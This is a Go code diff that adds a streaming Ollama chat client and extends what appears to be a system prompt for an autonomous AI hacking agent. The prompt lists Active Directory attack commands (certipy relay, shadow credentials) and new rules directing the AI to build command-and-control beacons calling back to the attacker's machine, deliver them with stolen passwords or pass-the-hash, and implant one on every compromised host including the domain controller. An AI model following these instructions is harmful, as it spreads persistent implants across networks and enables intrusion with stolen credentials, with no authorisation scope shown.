@@ -1,6 +1,7 @@
 package client
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -106,6 +107,69 @@ func ollamaChat(url, model string, msgs []ollamaMsg) (string, error) {
 		return "", fmt.Errorf("ollama error: %s", r.Error)
 	}
 	return r.Message.Content, nil
+}
+
+var reThinkBlock = regexp.MustCompile(`(?s)<think>(.*?)</think>`)
+
+// ollamaChatStream streams tokens from Ollama and calls cb with each chunk.
+// cb receives (token, insideThink). Returns the full response when done.
+func ollamaChatStream(url, model string, msgs []ollamaMsg, cb func(tok string, think bool)) (string, error) {
+	body, _ := json.Marshal(ollamaReq{
+		Model:    model,
+		Messages: msgs,
+		Stream:   true,
+		Options:  map[string]any{"temperature": 0.15, "num_predict": 2048},
+	})
+	client := &http.Client{Timeout: 10 * time.Minute}
+	resp, err := client.Post(url+"/api/chat", "application/json", bytes.NewReader(body))
+	if err != nil {
+		return "", fmt.Errorf("ollama: %w", err)
+	}
+	defer resp.Body.Close()
+
+	var full strings.Builder
+	inThink := false
+	scanner := bufio.NewScanner(resp.Body)
+	scanner.Buffer(make([]byte, 1<<20), 1<<20)
+	for scanner.Scan() {
+		line := scanner.Bytes()
+		if len(line) == 0 {
+			continue
+		}
+		var chunk struct {
+			Message struct {
+				Content string `json:"content"`
+			} `json:"message"`
+			Done  bool   `json:"done"`
+			Error string `json:"error"`
+		}
+		if json.Unmarshal(line, &chunk) != nil {
+			continue
+		}
+		if chunk.Error != "" {
+			return "", fmt.Errorf("ollama: %s", chunk.Error)
+		}
+		tok := chunk.Message.Content
+		if tok != "" {
+			full.WriteString(tok)
+			// Track <think> state across tokens
+			acc := full.String()
+			wasThink := inThink
+			if !inThink && strings.Contains(acc, "<think>") {
+				inThink = true
+			}
+			if inThink && strings.Contains(acc, "</think>") {
+				inThink = false
+			}
+			if cb != nil {
+				cb(tok, wasThink || inThink)
+			}
+		}
+		if chunk.Done {
+			break
+		}
+	}
+	return full.String(), scanner.Err()
 }
 
 // ── Claude (Anthropic) ───────────────────────────────────────────────────
@@ -463,6 +527,20 @@ certipy auth -pfx file.pfx -dc-ip <ip>
 certipy shadow <ip> -u u@dom -p p -account victim -dc-ip <ip> auto
 certipy relay -target http://<ca-ip>
 
+=== AGENT DEPLOYMENT (get a real beacon on a pwned host) ===
+listener start http <port>
+build http <kali_ip> <port> [sleep_sec]
+deliver <target_ip> -u <user> -p <pass> -d <domain>
+deliver <target_ip> -u <user> -H <nthash> -d <domain>
+wait_agent [timeout_sec]
+
+DEPLOYMENT WORKFLOW — use this when you have valid credentials on any Windows host:
+  <cmd>listener start http 8080</cmd>
+  <cmd>build http <YOUR_KALI_IP> 8080 5</cmd>
+  <cmd>deliver <target_ip> -u <user> -p <pass> -d <domain></cmd>
+  <cmd>wait_agent 120</cmd>
+→ On success wait_agent auto-selects the new agent. Then use shell/token/etc to continue.
+
 === MANAGEMENT ===
 agents          list agents (use first 8 chars of ID)
 use <id>        select agent
@@ -471,6 +549,8 @@ jobs            list listeners
 RULES:
 - Pass-the-hash: use -H :NThash (never quote colons in hashes)
 - Kerberos: after gettgt, next command can use KRB5CCNAME implicitly
+- Deploy an agent on EVERY host where you get admin credentials — do not just run wmiexec interactively
+- After getting DA hash from secretsdump: deliver agent to DC, wait_agent, then shell whoami to confirm
 - If a command fails, try alternative attack path
 - Never repeat the same failed command
 - Execute one command at a time, analyze output before proceeding
